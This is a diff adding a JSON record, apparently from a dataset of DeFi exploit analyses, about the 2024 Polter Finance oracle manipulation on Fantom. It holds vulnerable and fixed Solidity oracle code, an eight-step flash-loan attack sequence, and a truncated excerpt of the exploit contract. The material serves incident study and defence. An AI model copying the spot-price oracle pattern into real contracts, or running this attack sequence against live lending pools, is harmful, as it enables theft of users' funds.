@@ -1,0 +1,50 @@
+{
+ "id": "2024__2024-11-19_PolterFinance_EmptyMarket_FTM",
+ "source_file": "2024/2024-11-19_PolterFinance_EmptyMarket_FTM.md",
+ "title": "Polter Finance — Empty Market Oracle Manipulation Attack Analysis",
+ "date": "2024-11-19",
+ "protocol": "Polter Finance",
+ "chain": "Fantom",
+ "loss_raw": "~$8,700,000 on-chain verified (wFTM, MIM, sFTMX, axlUSDC, wBTC, wETH, USDCe, wSOL); some sources cite ~$12M reflecting SGD-denominated founder estimate or post-attack token price movements",
+ "loss_usd": 8700000.0,
+ "root_cause": "The oracle for the newly listed BOO lending market relied directly on SpookySwap liquidity pool spot prices — the attacker drained the pool via flash loan to inflate the BOO price to ~$1.37 trillion, then borrowed all pool assets",
+ "attack_tx": "0x5118...eac",
+ "vulnerable_contract": "0x867f...6d5 (LendingPool)",
+ "classes": [
+  "donation-inflation"
+ ],
+ "code_before": [
+  "// ChainlinkUniV2Adapter.sol\n// ❌ VULNERABILITY: Calculates price directly from current SpookySwap pool reserve ratio\n//                  Completely unable to detect reserve manipulation via flash loan\n\nfunction _fetchPrice() internal view returns (uint256) {\n    // Calculate spot price directly from SpookySwap V2 pair reserves\n    (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(spookyPair).getReserves();\n\n    // ❌ Only uses current block's reserve ratio — no TWAP\n    uint256 price = (uint256(reserve1) * 1e18) / uint256(reserve0);\n    return price;\n}\n\nfunction getRoundData(uint80 _roundId)\n    external\n    view\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    )\n{\n    int256 price = int256(_fetchPrice());\n    // ❌ Hardcoded answeredInRound: always returns roundId = 2\n    //    This causes AaveOracle's price validity check logic to be bypassed\n    return (2, price, block.timestamp, block.timestamp, 2);\n}\n\nfunction latestRoundData()\n    external\n    view\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    )\n{\n    // ❌ Latest price also returns spot price — no spike detection\n    int256 price = int256(_fetchPrice());\n    return (2, price, block.timestamp, block.timestamp, 2);\n}",
+  "// AaveOracle.sol (Aave v2 fork)\n// ❌ VULNERABILITY: Does not validate oracle implementation safety when adding new asset markets\n//                  An oracle address, once registered, is immediately used in production\n\nfunction setAssetSources(\n    address[] calldata assets,\n    address[] calldata sources\n) external onlyOwner {\n    for (uint256 i = 0; i < assets.length; i++) {\n        assetsSources[assets[i]] = IChainlinkAggregator(sources[i]);\n        // ❌ No validation of oracle implementation method, TWAP usage, price range limits, etc.\n        emit AssetSourceUpdated(assets[i], sources[i]);\n    }\n}\n\nfunction getAssetPrice(address asset) public view returns (uint256) {\n    IChainlinkAggregator source = assetsSources[asset];\n    // ❌ Trusts the oracle even if a spot price oracle is registered\n    (, int256 price,,,) = source.latestRoundData();\n    require(price > 0, \"Invalid price\");\n    return uint256(price);\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: Use Uniswap V3 TWAP + price spike detection\n\nuint32 constant TWAP_PERIOD = 1800; // 30-minute TWAP\nuint256 constant MAX_PRICE_DEVIATION = 150; // Allow max 150% price deviation\n\nfunction _fetchPriceTWAP() internal view returns (uint256) {\n    // ✅ Query Uniswap V3 TWAP — 30-minute historical average price\n    uint32[] memory secondsAgos = new uint32[](2);\n    secondsAgos[0] = TWAP_PERIOD;\n    secondsAgos[1] = 0;\n    (int56[] memory tickCumulatives,) = IUniswapV3Pool(v3Pool).observe(secondsAgos);\n    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];\n    int24 timeWeightedTick = int24(tickDelta / int56(uint56(TWAP_PERIOD)));\n    return TickMath.getSqrtRatioAtTick(timeWeightedTick);\n}\n\nfunction latestRoundData()\n    external\n    view\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    )\n{\n    int256 twapPrice = int256(_fetchPriceTWAP());\n    int256 spotPrice = int256(_fetchSpotPrice());\n\n    // ✅ Revert if spot price exceeds threshold deviation from TWAP\n    uint256 deviation = spotPrice > twapPrice\n        ? (uint256(spotPrice - twapPrice) * 100) / uint256(twapPrice)\n        : (uint256(twapPrice - spotPrice) * 100) / uint256(twapPrice);\n    require(deviation <= MAX_PRICE_DEVIATION, \"Price deviation too high\");\n\n    // ✅ Return dynamic roundId\n    uint80 currentRound = ++roundId;\n    return (currentRound, twapPrice, block.timestamp, block.timestamp, currentRound);\n}",
+  "// ✅ Fix: Validate minimum TWAP period and deviation limits when registering oracle\n\nstruct OracleConfig {\n    address source;\n    uint256 maxPriceDeviation; // Maximum allowed deviation (basis points)\n    uint32 heartbeatInterval;  // Maximum price update interval\n}\n\nmapping(address => OracleConfig) public assetOracleConfigs;\n\nfunction setAssetSources(\n    address[] calldata assets,\n    address[] calldata sources,\n    uint256[] calldata maxDeviations\n) external onlyOwner {\n    for (uint256 i = 0; i < assets.length; i++) {\n        // ✅ Validate basic behavior of oracle address\n        (, int256 price,, uint256 updatedAt,) =\n            IChainlinkAggregator(sources[i]).latestRoundData();\n        require(price > 0, \"Oracle: invalid initial price\");\n        require(updatedAt > block.timestamp - 3600, \"Oracle: stale data\");\n\n        assetOracleConfigs[assets[i]] = OracleConfig({\n            source: sources[i],\n            maxPriceDeviation: maxDeviations[i],\n            heartbeatInterval: 3600\n        });\n    }\n}"
+ ],
+ "steps": [
+  "Funded via Tornado Cash → Fantom bridge",
+  "Step 1: WFTM_SpookyToken_V3Pool.flash(...)",
+  "→ Flash loan entire BOO balance from SpookySwap V3",
+  "→ Borrow ~1,154,788 BOO",
+  "Step 2: JFTM_SpookyToken_V2Pool.swap(...)",
+  "→ Drain nearly all BOO from SpookySwap V2 pool",
+  "→ V2 pool: 269,042 BOO removed, balance ≈ minimum",
+  "Step 3: router.swapExactTokensForTokensSupportingFee...",
+  "→ Buy small amount of BOO with 5,000 WFTM (gas adjust)",
+  "Step 4: Oracle price manipulation result",
+  "→ reserve0 ≈ dust → price inflated by hundreds of",
+  "→ 1 BOO value ≈ $1,370,000,000,000 ($1.37 trillion)",
+  "Step 5: pitfall.deposit(BOO, 1e18, ...)",
+  "→ Deposit only 1 BOO (~$0.33 real value) as collateral",
+  "→ AaveOracle: collateral value evaluated at $1.37T",
+  "Step 6: Drain entire lending pool (8 assets)",
+  "Step 7: Repay V2 flash loan",
+  "→ Repayment complete including fee",
+  "Step 8: Transfer remaining assets to attacker EOA",
+  "All stolen tokens → owner (attacker EOA)"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────┐\n│  Attacker EOA (0x511f...44a6)                                    │\n│  Funded via Tornado Cash → Fantom bridge                        │\n└────────────────────────┬────────────────────────────────────────┘\n                         │ Deploy attack contract and call doTask()\n                         ▼\n┌─────────────────────────────────────────────────────────────────┐\n│  EXPLOIT_DO3 Contract (0xA214...33a)                            │\n│  Step 1: WFTM_SpookyToken_V3Pool.flash(...)                     │\n│          → Flash loan entire BOO balance from SpookySwap V3     │\n│          → Borrow ~1,154,788 BOO                                │\n└────────────────────────┬────────────────────────────────────────┘\n                        ",
+  "// SPDX-License-Identifier: UNLICENSED\n// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/PolterFinance_exploit.sol\n\ncontract EXPLOIT_DO3 {\n    function doTask() public payable {\n        // [Step 1] Request flash loan of entire BOO token balance from SpookySwap V3\n        // Borrow all BOO from V3 pool to begin removing liquidity\n        WFTM_SpookyToken_V3Pool.flash(\n            address(this),\n            0,\n            spookyToken.balanceOf(address(WFTM_SpookyToken_V3Pool)),\n            \"\"\n        );\n    }\n\n    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {\n        uint256 needToRepay = spookyToken.balanceOf(address(this)) + fee1;\n\n        // [Step 2] Drain nearly all BOO tokens from SpookySwap V2 pool as well\n        // → "
+ ]
+}
